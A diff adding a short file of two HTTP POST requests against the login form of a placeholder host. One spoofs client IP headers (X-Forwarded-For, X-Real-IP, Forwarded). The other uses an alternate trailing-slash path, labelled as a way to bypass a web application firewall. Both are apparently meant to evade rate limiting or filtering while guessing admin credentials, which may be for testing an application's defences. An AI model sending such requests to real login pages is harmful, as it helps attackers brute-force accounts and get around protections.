@@ -1,0 +1,18 @@
+### Spoofed IP Attack
+
+POST /login HTTP/1.1
+Host: vulnerable.site
+Content-Type: application/x-www-form-urlencoded
+X-Forwarded-For: 192.168.1.102
+X-Real-IP: 10.10.10.11
+Forwarded: for=203.0.113.1
+
+username=admin&password=wrongpass
+
+### Alternate path to bypass WAF
+
+POST /login/ HTTP/1.1
+Host: vulnerable.site
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=wrongpass
